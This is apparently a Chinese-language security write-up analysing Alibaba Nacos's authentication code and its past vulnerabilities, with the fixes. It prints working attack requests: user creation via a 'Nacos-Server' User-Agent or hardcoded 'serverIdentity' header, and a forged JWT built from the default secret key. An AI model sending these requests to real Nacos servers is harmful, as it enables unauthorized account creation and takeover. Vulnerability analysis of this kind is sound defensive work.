## 环境搭建

官方网址：https://github.com/alibaba/nacos

github上下载server版，进入bin目录，执行如下命令（nacos的运行环境是java1.8）。windows平台运行`.cmd`文件

```
sh startup.sh -m standalone
```

然后访问

```
http://ip:8848/nacos/#/login
```


## Nacos简介

Nacos（Dynamic Naming and Configuration Service）用于动态服务发现、配置和管理，构建云原生应用和微服务平台。Nacos支持各类服务，如Dubbo/gRPC服务、Spring Cloud RESTful服务、Kubernetes服务。

Nacos想要只用一个程序包就可以快速启动Nacos。由于Nacos需要存储数据，在集群模式下就需要考虑如何让节点之间的数据保持一致。这种一致性算法在工业生产中用的最多的就是Raft协议。另外，还采用了最终一致性协议Distro。

Nacos官方文档参考：https://www.yuque.com/nacos/ebook/ynstox

常见端口如下。

| 端口 | 描述                                                 |
| ---- | ---------------------------------------------------- |
| 8848 | 主端口，客户端、控制台及OpenAPI所使用的HTTP端口      |
| 9848 | 客户端gRPC请求服务端端口，用于客户端向服务端发起请求 |
| 9849 | 服务端gRPC请求服务端端口，用于服务间同步等           |
| 7848 | Jraft请求服务端端口                                  |



## 框架结构

1.4.0版本中目录结构包含`api、auth、client、cmdb、common、config、consistency、console、core、distribution、istio、naming、sys`等文件夹。整体框架采用Springboot

首先看core的核心文件

```
com.alibaba.nacos.core
  |- auth
  |- cluster
  |- code
  |- controller /v1/core/ops、/v1/core/cluster
  |- distributed
  |- exception
  |- monitor
  |- storage
  |- utils
```

### 权限校验

在auth中通过AuthConfig给所有的路由添加了一个`AuthFilter`

```java
@Configuration
public class AuthConfig {
    
    @Bean
    public FilterRegistrationBean authFilterRegistration() {
        FilterRegistrationBean<AuthFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(authFilter());
        registration.addUrlPatterns("/*");
        registration.setName("authFilter");
        registration.setOrder(6);
        
        return registration;
    }
    
    @Bean
    public AuthFilter authFilter() {
        return new AuthFilter();
    }
}
```

#### 1.4.0 版本权限校验

跟进AuthFilter。先是从`conf/application.properties`中读取`nacos.core.auth.enabled`的值，该值默认为false。

```java
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        
        if (!authConfigs.isAuthEnabled()) { //读取System.getProperty("nacos.core.auth.enabled");的值，如果没有值默认返回false。
            chain.doFilter(request, response); 
            return;
        }
        
        String userAgent = WebUtils.getUserAgent(req); // 获取头部User-Agent
        
        if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) { // 如果User-Agent的值为Nacos-Server
            chain.doFilter(request, response); 
            return;
        }
        
        try {
            Method method = methodsCache.getMethod(req);
            if (method == null) {
                chain.doFilter(request, response);
                return;
            }
            
            if (method.isAnnotationPresent(Secured.class) && authConfigs.isAuthEnabled()) {
                ...
                authManager.auth(new Permission(resource, action), authManager.login(req));
                
            }
            chain.doFilter(request, response);
        } ...
    }
```

开发者一般如果要开启权限校验，会将`nacos.core.auth.enabled`的值改为true。

```java
if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) { 
    chain.doFilter(request, response); 
    return;
}
```

如果User-Agent的值为`Nacos-Server`即可绕过所有的校验。这也是CVE-2021-29441的原理。

#### 1.4.1 版本权限校验

后来在1.4.1版本中，修复的代码如下。

```java
if (authConfigs.isEnableUserAgentAuthWhite()) {
    String userAgent = WebUtils.getUserAgent(req);
    if (StringUtils.startsWith(userAgent, Constants.NACOS_SERVER_HEADER)) {
        chain.doFilter(request, response);
        return;
    }
}else if (StringUtils.isNotBlank(authConfigs.getServerIdentityKey()) && StringUtils.isNotBlank(authConfigs.getServerIdentityValue())) {
    String serverIdentity = req.getHeader(authConfigs.getServerIdentityKey());
    if (authConfigs.getServerIdentityValue().equals(serverIdentity)) {
        chain.doFilter(request, response);
        return;
    }
} else { /*sendError */
    return;
}
```

首先是`conf/application.properties`增加了属性`nacos.core.auth.enable.userAgentAuthWhite`，默认值为true。相当于又增加了一个头部校验的开关。如果这个值开发者改为false。就不会被User-Agent绕过校验。另外，当值设为false时，nacos也为开发者设置了`identity`键值对用于进一步校验。键key相当于一个新设置的Header，当该Header的值为value的值时即通过校验。

```
### Since 1.4.1, worked when nacos.core.auth.enabled=true and nacos.core.auth.enable.userAgentAuthWhite=false.
### The two properties is the white list for auth and used by identity the request from other server.
nacos.core.auth.server.identity.key=
nacos.core.auth.server.identity.value=
```

但是在后续的版本中，如2.2.0版本`identity`设置了默认值

```
nacos.core.auth.server.identity.key=serverIdentity
nacos.core.auth.server.identity.value=security
```

此时就出现了硬编码绕过权限校验的漏洞

```
POST /nacos/v1/auth/users?username=admin&password=123
Host: ip
serverIdentity: security
```

后续的修复和JWT Token权限校验漏洞的修复方式一样，都是去掉了硬编码，设为了空。并且要求用户进行设置，否则无法启动。



## 历史漏洞

| 漏洞编号             | 漏洞类型                 | 影响范围               |
| -------------------- | ------------------------ | ---------------------- |
| CVE-2021-29441       | User-Agent权限绕过       | <1.4.2                 |
| CVE-2021-29441的绕过 | url权限绕过              | <1.4.2                 |
| QVD-2023-6271        | accessToken认证绕过      | <=2.2.0                |
| CVE-2021-29441的绕过 | serverIdentity硬编码绕过 | <=2.2.0                |
| 无                  | Hessian反序列化漏洞      | 2.0.0 <= Nacos < 2.2.3 |



### CVE-2021-29441

在框架结构的1.4.0版本权限校验中说到如果User-Agent的值为`Nacos-Server`即可绕过所有的校验。结合后台Controller能够造成的威胁，可以创造新用户

```
POST /nacos/v1/auth/users?username=123&password=123 HTTP/1.1
Host: ip
User-Agent: Nacos-Server
```

对应的UserController代码如下

```java
@RestController("user")
@RequestMapping({"/v1/auth", "/v1/auth/users"})
public class UserController {
    @Secured(resource = NacosAuthConfig.CONSOLE_RESOURCE_NAME_PREFIX + "users", action = ActionTypes.WRITE)
    @PostMapping
    public Object createUser(@RequestParam String username, @RequestParam String password) {
        
        User user = userDetailsService.getUserFromDatabase(username);
        if (user != null) {
            throw new IllegalArgumentException("user '" + username + "' already exist!");
        }
        userDetailsService.createUser(username, PasswordEncoderUtil.encode(password));
        return new RestResult<>(200, "create user ok!");
    }
}
```



### JWT Token权限校验

另外，`conf/application.properties`中还有一个硬编码的属性。

```
nacos.core.auth.default.token.secret.key=SecretKey012345678901234567890123456789012345678901234567890123456789
```

如果采用默认的用户名密码登陆，请求包如下

```
POST /nacos/v1/auth/users/login HTTP/1.1
Host: ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Connection: close
Content-Length: 29

username=nacos&password=nacos
```

会发现回显如下

```
HTTP/1.1 200 
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcwNTA2NzMwN30.ffm1aAW-Lkn0KbVOFO5IWUvRrh8fJblLVf4Jwf4Lcbo
Content-Type: application/json;charset=UTF-8
Date: Fri, 12 Jan 2024 08:48:27 GMT
Connection: close
Content-Length: 162

{"accessToken":"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcwNTA2NzMwN30.ffm1aAW-Lkn0KbVOFO5IWUvRrh8fJblLVf4Jwf4Lcbo","tokenTtl":18000,"globalAdmin":true}
```

放到`https://jwt.io/`下解密。exp可以用`https://tool.lu/timestamp/`unix时间戳生成。

```
{
  "sub": "nacos",
  "exp": 1705067307
}
```

根据`security.key`的硬编码值`SecretKey012345678901234567890123456789012345678901234567890123456789`，和一个晚于当前时间的时间戳。生成base64编码。

![image-20240112170234236](/images/image-20240112170234236.png)

放入到请求包中可随意登陆

```
POST /nacos/v1/auth/users/login HTTP/1.1
Host: ip
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTcwNzcyODIyN30.Dx2F0oNSEbWTtxszvifb6lMsqwuCY9S2VQilA03ejCg
Connection: close
Content-Length: 25

username=111&password=111
```

那么从代码中，这个key到底是怎么用的？

```java
    @PostMapping("/login")
    public Object login(@RequestParam String username, @RequestParam String password, HttpServletResponse response, HttpServletRequest request) throws AccessException {
        
        if (AuthSystemTypes.NACOS.name().equalsIgnoreCase(authConfigs.getNacosAuthSystemType())) {
            NacosUser user = (NacosUser) authManager.login(request); // 核心处理
            
            response.addHeader(NacosAuthConfig.AUTHORIZATION_HEADER, NacosAuthConfig.TOKEN_PREFIX + user.getToken()); //Response添加头部 Authorization: Bearer + userToken
            ...
        }
    }

public User login(Object request) throws AccessException {
    String token = resolveToken(req);
    tokenManager.validateToken(token);
}
```

核心login的处理主要是两步，获取token，校验token。

获取token。

```java
    private String resolveToken(HttpServletRequest request) throws AccessException {
        String bearerToken = request.getHeader(NacosAuthConfig.AUTHORIZATION_HEADER); // Authorization
        if (StringUtils.isNotBlank(bearerToken) && bearerToken.startsWith(TOKEN_PREFIX)) { // Bearer
            return bearerToken.substring(7); // 如果Bearer后不为空，返回Bearer后的内容
        }
        bearerToken = request.getParameter(Constants.ACCESS_TOKEN); // 获取accessToken参数值
        if (StringUtils.isBlank(bearerToken)) { // 如果accessToken是空，获取用户名密码
            String userName = request.getParameter("username");
            String password = request.getParameter("password");
            bearerToken = resolveTokenFromUser(userName, password);
        }
        
        return bearerToken; // 否则返回accessToken的值
    }
```

校验token。可以看到获取了`security.key`的值并进行base64解密，然后将其设定为JWT的key。这也是在生成时需要勾选base64的原因。

```java
    public void validateToken(String token) {
        Jwts.parserBuilder().setSigningKey(authConfigs.getSecretKeyBytes()).build().parseClaimsJws(token);
    }

    public byte[] getSecretKeyBytes() {
        if (secretKeyBytes == null) {
            secretKeyBytes = Decoders.BASE64.decode(secretKey); 
        }
        return secretKeyBytes;
    }

    @Value("${nacos.core.auth.default.token.secret.key:}")
    private String secretKey;
```

顺便看一眼`JwtTokenManager.createToken()`中Token的生成代码

```java
    public String createToken(String userName) {
        
        long now = System.currentTimeMillis();
        
        Date validity;
        validity = new Date(now + authConfigs.getTokenValidityInSeconds() * 1000L);
        
        Claims claims = Jwts.claims().setSubject(userName);
        return Jwts.builder().setClaims(claims).setExpiration(validity)
                .signWith(Keys.hmacShaKeyFor(authConfigs.getSecretKeyBytes()), SignatureAlgorithm.HS256).compact();
    }
```

后来在补丁修复中，将`nacos.core.auth.default.token.secret.key`设为了空，并且需要用户自行填充，否则无法启动节点。



### Hessian 反序列化漏洞

网上的分析文章很多。

后续的修复：https://github.com/alibaba/nacos/pull/10542/files 。 官方采用了白名单的方式限制了反序列化的类。
